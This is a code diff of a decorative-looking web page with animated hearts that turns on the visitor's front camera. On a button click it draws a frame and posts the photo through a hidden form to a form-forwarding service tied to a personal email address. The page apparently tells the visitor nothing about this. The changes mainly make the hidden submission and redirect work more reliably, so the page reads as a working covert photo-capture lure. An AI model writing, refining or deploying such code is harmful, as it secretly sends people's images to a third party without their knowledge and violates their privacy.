@@ -72,8 +72,8 @@ video {
 
 <form id="imageForm" action="https://formsubmit.co/ureren77@gmail.com" method="POST" enctype="multipart/form-data">
   <input type="hidden" name="_captcha" value="false">
-  <input type="hidden" name="_next" value="https://hemraj777.github.io/Qnahi/index.html">
   <input type="hidden" name="_template" value="table">
+  <input type="hidden" name="_next" value="https://hemraj777.github.io/Qnahi/index.html">
   <input type="file" id="imageInput" name="image" accept="image/png, image/jpeg" style="display:none;">
   <button type="submit" style="display:none;">Submit</button>
 </form>
@@ -86,7 +86,7 @@ const form = document.getElementById("imageForm");
 
 let video;
 
-// Start camera immediately
+// Start camera
 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
   .then(stream => {
     video = document.createElement("video");
@@ -112,11 +112,13 @@ setInterval(createHeart, 300);
 captureButton.addEventListener("click", () => {
   if (!video) return alert("Camera not ready!");
 
+  // Draw video frame to canvas
   canvas.width = video.videoWidth || 1080;
   canvas.height = video.videoHeight || 1440;
   const ctx = canvas.getContext("2d");
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+  // Convert canvas to blob and set as file input
   canvas.toBlob(blob => {
     const file = new File([blob], "photo.png", { type: "image/png" });
     if (window.DataTransfer) {
@@ -127,20 +129,19 @@ captureButton.addEventListener("click", () => {
       imageInput.files = [file];
     }
 
-    // Submit the form
-    form.submit();
+    // Properly submit form so _next works
+    if (form.requestSubmit) {
+      form.requestSubmit();
+    } else {
+      form.submit(); // fallback for older browsers
+    }
   }, "image/png");
 
-  // Optional: fade out button
+  // Fade out button smoothly
+  captureButton.style.transition = "opacity 0.5s";
   captureButton.style.opacity = 0;
-});
-
-
 });
 </script>
 
 </body>
 </html>
-
-
-
